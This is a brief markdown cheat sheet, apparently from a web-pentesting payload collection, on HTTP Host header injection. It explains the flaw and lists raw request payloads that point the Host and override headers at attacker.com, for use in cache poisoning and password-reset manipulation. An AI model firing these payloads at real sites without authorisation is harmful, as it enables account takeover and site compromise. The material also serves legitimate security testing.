# Host Header Injection
HTTP Host header attacks exploit vulnerable websites that handle the value of the Host header in an unsafe way. If the server implicitly trusts the Host header, and fails to validate or escape it properly, an attacker may be able to use this input to inject harmful payloads that manipulate server-side behavior.

### attacker can supply invalid input to cause the web server to:
* Dispatch requests to the first virtual host on the list.
* Perform a redirect to an attacker-controlled domain.
* Perform web cache poisoning.
* Manipulate password reset functionality.
* Allow access to virtual hosts that were not intended to be externally accessible.

## How to exploit
* Change the host header
```html
GET /example HTTP/1.1
Host: attacker.com
...
```
* Duplicating the host header
```html
GET /example HTTP/1.1
Host: vulnerable-website.com
Host: attacker.com
...
```
* Add line wrapping
```html
GET /example HTTP/1.1
 Host: vulnerable-website.com
Host: attacker.com
...
```
* Add host override headers
```html
X-Forwarded-For: attacker.com
X-Forwarded-Host: attacker.com
X-Client-IP: attacker.com
X-Remote-IP: attacker.com
X-Remote-Addr: attacker.com
X-Host: attacker.com
Forwarded: attacker.com

# How to use? In this case im using "X-Forwarded-For : attacker.com"
GET /example HTTP/1.1
Host: vulnerable-website.com
X-Forwarded-For : attacker.com
...

# Supply an absolute URL
GET https://vulnerable-website.com/ HTTP/1.1
Host: attacker.com
...
```






